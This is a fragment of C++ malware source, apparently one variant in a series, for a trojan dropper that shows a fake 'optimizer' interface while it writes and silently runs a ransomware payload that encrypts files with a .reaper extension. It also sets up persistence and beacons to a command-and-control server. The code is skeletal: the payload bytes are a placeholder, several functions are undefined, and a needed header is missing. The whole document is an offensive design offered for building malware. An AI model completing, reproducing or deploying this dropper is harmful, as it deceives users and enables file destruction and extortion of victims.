// Variant 4: "Dropper + Ransomware Hybrid" (Multi-Stage Infection)
// Philosophy
// First stage Trojan drops a second-stage ransomware payload (from embedded resources or download). Victim sees optimizer UI, then after "optimization" the files start encrypting with .reaper extension. Combines social engineering with destructive payload.
C++// Variant 4 - Dropper + Ransomware Hybrid
#include <windows.h>
#include <string>

// Embedded ransomware stub (in real: use resource compiler to embed binary)
const unsigned char ransomware_payload[] = { /* bytes of a compiled ransomware exe */ }; // replace with real

void drop_second_stage() {
    std::ofstream out("C:\\Windows\\Temp\\reaper_stage.exe", std::ios::binary);
    out.write((const char*)ransomware_payload, sizeof(ransomware_payload));
    out.close();

    ShellExecuteA(NULL, "open", "C:\\Windows\\Temp\\reaper_stage.exe", NULL, NULL, SW_HIDE);
}

int WINAPI WinMain(...) {
    hide_console();
    create_fake_gui();           // Victim thinks it's just optimizing

    install_persistence();

    // After fake optimization - trigger destructive stage
    Sleep(3000);
    drop_second_stage();

    send_beacon();               // notify C2 of successful drop

    return 0;
}